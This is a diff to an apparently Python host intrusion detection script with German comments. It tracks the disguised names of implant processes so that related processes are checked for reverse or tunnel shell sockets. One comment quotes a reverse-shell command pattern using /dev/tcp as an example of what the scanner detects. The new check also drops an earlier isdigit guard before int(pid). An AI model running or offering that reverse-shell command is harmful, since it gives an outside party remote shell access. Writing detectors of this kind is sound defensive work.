@@ -1234,6 +1234,9 @@ _output_compiled = [(re.compile(p, re.IGNORECASE), lbl, sev) for p, lbl, sev in 
 _alerted_rootkit:   dict = {}  # key -> last-alert monotonic time
 _alerted_implants:  dict = {}  # key -> last-alert monotonic time
 _known_implant_pids: set = set()  # PIDs die als Implant erkannt wurden (für find_tunnel_shells)
+_known_implant_names: set = set()  # getarnte Prozessnamen (z.B. sd-pam) – deckt
+                                    # verwandte Prozesse mit anderer PID ab (z.B.
+                                    # Loader/Watchdog-Paar das sich selbst re-execed)
 
 # Namen echter Kernel-kworker-Threads (haben keine exe und keine Sockets)
 _KWORKER_RE   = re.compile(r'^kworker/')
@@ -1287,6 +1290,7 @@ def _check_process_implants():
     fake_pids = {pid for pid, info in all_procs.items()
                  if _KWORKER_RE.match(info['name']) and info['exe']}
     _known_implant_pids.update(fake_pids)
+    _known_implant_names.update(all_procs[p]['name'] for p in fake_pids)
     for pid in fake_pids:
         info  = all_procs[pid]
         ppid  = info['ppid']
@@ -1323,6 +1327,7 @@ def _check_process_implants():
             continue
         if info['exe'].endswith(' (deleted)') and info['name'] not in _SAFE_DELETED:
             _known_implant_pids.add(pid)
+            _known_implant_names.add(info['name'])
             key = f'deleted:{pid}'
             if now - _alerted_implants.get(key, -999) > 60:
                 _alerted_implants[key] = now
@@ -1949,11 +1954,14 @@ def find_tunnel_shells():
                 # FD 0,1,2 immer prüfen (stdin+stdout+stderr), bei shellish alle FDs.
                 # So werden auch 'bash -i >& /dev/tcp/IP/PORT 0>&1' Muster erkannt
                 # wo der Socket auf FD 1/2 liegt, bevor die 0>&1 Umleitung greift.
-                # Bereits als Implant erkannte PIDs (getarnter Prozessname, z.B.
-                # sd-pam mit gelöschtem Binary) ebenfalls auf allen FDs prüfen –
-                # ihr Socket liegt oft nicht auf stdin/stdout/stderr.
+                # Bereits als Implant erkannte PIDs ODER Prozesse mit demselben
+                # getarnten Namen (z.B. sd-pam) ebenfalls auf allen FDs prüfen –
+                # ein Loader/Watchdog-Paar hält den Socket oft in einem anderen
+                # Prozess (andere PID) als dem, der als "deleted binary" auffiel.
+                _is_known_implant = (int(pid) in _known_implant_pids or
+                                      any(n and n in cmd for n in _known_implant_names))
                 fd_names = ['0', '1', '2']
-                if shellish or (pid.isdigit() and int(pid) in _known_implant_pids):
+                if shellish or _is_known_implant:
                     fd_names = os.listdir(f'/proc/{pid}/fd')
                 for fd_name in fd_names:
                     link = os.readlink(f'/proc/{pid}/fd/{fd_name}')
